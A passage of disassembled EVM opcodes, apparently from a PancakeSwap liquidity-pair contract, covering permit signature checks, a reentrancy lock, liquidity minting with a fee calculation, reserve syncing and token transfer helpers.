RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x16B5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH2 0x1D29 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x172F SWAP3 DUP5 SWAP3 DUP8 SWAP3 PUSH2 0x16C3 SWAP3 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x168B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP PUSH1 0x1 PUSH1 0x10 SSTORE POP JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x179F JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x18BA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x18F0 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x1941 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x194C DUP10 DUP10 DUP10 PUSH2 0x2139 JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x19A2 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 DUP2 SWAP1 SSTORE DUP1 PUSH2 0x19B2 PUSH2 0xC9D JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1A06 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1A1A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1A30 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1A83 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1A97 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1AAD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0x1ACC DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1AE9 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1AF7 DUP8 DUP8 PUSH2 0x2243 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x1B30 JUMPI PUSH2 0x1B1B PUSH2 0x3E8 PUSH2 0xB60 PUSH2 0x1075 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP9 POP PUSH2 0x1B2A PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2530 JUMP JUMPDEST POP PUSH2 0x1B50 JUMP JUMPDEST PUSH2 0x1B4D PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x10AB DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x1B8F JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x26E0 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1B99 DUP11 DUP11 PUSH2 0x2530 JUMP JUMPDEST POP PUSH2 0x1132 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1F76 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xA SLOAD DUP2 JUMP JUMPDEST PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x1C12 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 SSTORE PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x1D22 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1C63 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1C77 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1C8D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1CDA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1CEE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1D04 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH2 0x1F76 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x10 SSTORE JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x19 DUP2 MSTORE PUSH32 0x7472616E7366657228616464726573732C75696E743235362900000000000000 PUSH1 0x20 SWAP2 DUP3 ADD MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x44 DUP1 DUP4 ADD DUP7 SWAP1 MSTORE DUP5 MLOAD DUP1 DUP5 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0x64 SWAP1 SWAP3 ADD DUP5 MSTORE SWAP2 DUP2 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0xA9059CBB PUSH1 0xE0 SHL OR DUP2 MSTORE SWAP3 MLOAD DUP2 MLOAD PUSH1 0x0 SWAP5 PUSH1 0x60 SWAP5 DUP10 AND SWAP4 SWAP3 SWAP2 DUP3 SWAP2 SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1DD6 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x1DB7 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1E38 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1E3D JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 DUP1 ISZERO PUSH2 0x1E6B JUMPI POP DUP1 MLOAD ISZERO DUP1 PUSH2 0x1E6B JUMPI POP DUP1 DUP1 PUSH1 0x20 ADD SWAP1 MLOAD PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1E68 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD JUMPDEST PUSH2 0x1EBC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x18 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A205452414E534645525F4641494C45440000000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO DUP1 PUSH2 0x1EDE JUMPI POP POP DUP1 DUP3 MUL DUP3 DUP3 DUP3 DUP2 PUSH2 0x1EDB JUMPI INVALID JUMPDEST DIV EQ JUMPDEST PUSH2 0xCD8 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6D756C2D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0xCD8 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 GT DUP1 ISZERO SWAP1 PUSH2 0x1F94 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 GT ISZERO JUMPDEST PUSH2 0x1FD9 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x11 PUSH1 0x24 DUP3 ADD MSTORE PUSH17 0x50616E63616B653A204F564552464C4F57 PUSH1 0x78 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0xB SLOAD PUSH4 0xFFFFFFFF TIMESTAMP DUP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV DUP2 AND DUP3 SUB SWAP1 DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x2009 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 AND ISZERO ISZERO JUMPDEST DUP1 ISZERO PUSH2 0x201D JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 AND ISZERO ISZERO JUMPDEST ISZERO PUSH2 0x208E JUMPI DUP1 PUSH4 0xFFFFFFFF AND PUSH2 0x204B DUP6 PUSH2 0x2036 DUP7 PUSH2 0x2616 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x2628 AND JUMP JUMPDEST PUSH1 0xC DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE PUSH4 0xFFFFFFFF DUP2 AND PUSH2 0x2076 DUP5 PUSH2 0x2036 DUP8 PUSH2 0x2616 JUMP JUMPDEST PUSH1 0xD DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE JUMPDEST PUSH1 0xB DUP1 SLOAD PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP2 SWAP1 SWAP2 OR PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF PUSH1 0x70 SHL NOT AND PUSH1 0x1 PUSH1 0x70 SHL DUP9 DUP4 AND DUP2 MUL SWAP2 SWAP1 SWAP2 OR PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH1 0x1 PUSH1 0xE0 SHL PUSH4 0xFFFFFFFF DUP8 AND MUL OR SWAP3 DUP4 SWAP1 SSTORE PUSH1 0x40 DUP1 MLOAD DUP5 DUP5 AND DUP2 MSTORE SWAP2 SWAP1 SWAP4 DIV SWAP1 SWAP2 AND PUSH1 0x20 DUP3 ADD MSTORE DUP2 MLOAD PUSH32 0x1C411E9A96E071241C2F21F7726B17AE89E3CAB4C78BE50E062B03A9FFFBBAD1 SWAP3 SWAP2 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG1 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x21C4 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x21F9 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x272E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x17E7E58 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2294 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x22A8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x22BE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xE SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND ISZERO DUP1 ISZERO SWAP5 POP SWAP2 SWAP3 POP SWAP1 PUSH2 0x23A2 JUMPI DUP1 ISZERO PUSH2 0x239D JUMPI PUSH1 0x0 PUSH2 0x2301 PUSH2 0x1075 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP1 DUP9 AND PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x230E DUP4 PUSH2 0x23B6 JUMP JUMPDEST SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x239A JUMPI PUSH1 0x0 PUSH2 0x2341 PUSH1 0x8 PUSH2 0xBAA PUSH2 0x2332 DUP7 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x2376 PUSH2 0x2359 DUP5 PUSH1 0x8 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH2 0x236A DUP7 PUSH1 0x11 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 DUP4 DUP2 PUSH2 0x2383 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 ISZERO PUSH2 0x2396 JUMPI PUSH2 0x2396 DUP8 DUP3 PUSH2 0x2408 JUMP JUMPDEST POP POP POP JUMPDEST POP POP JUMPDEST PUSH2 0x23AE JUMP JUMPDEST DUP1 ISZERO PUSH2 0x23AE JUMPI PUSH1 0x0 PUSH1 0xE SSTORE JUMPDEST POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x3 DUP3 GT ISZERO PUSH2 0x23F9 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x2 DUP3 DIV ADD JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x23F3 JUMPI DUP1 SWAP2 POP PUSH1 0x2 DUP2 DUP3 DUP6 DUP2 PUSH2 0x23E2 JUMPI INVALID JUMPDEST DIV ADD DUP2 PUSH2 0x23EB JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x23CB JUMP JUMPDEST POP PUSH2 0x2403 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x2403 JUMPI POP PUSH1 0x1 JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x241B SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x2446 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x264D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 DUP2 DUP2 MSTORE 